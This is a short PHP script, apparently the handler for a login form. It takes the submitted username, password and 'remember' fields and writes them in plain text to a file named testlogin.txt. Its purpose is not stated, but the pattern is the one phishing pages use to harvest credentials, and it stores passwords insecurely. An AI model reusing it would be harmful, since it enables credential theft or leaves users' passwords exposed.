<?php
$myfile = fopen("testlogin.txt", "w") or die("Unable to open file!");
$txt = $_POST["uname"];
fwrite($myfile, $txt);
$txt = $_POST["psw"];
fwrite($myfile, $txt);
$txt = $_POST["remember"];
fwrite($myfile, $txt);
fclose($myfile);
?>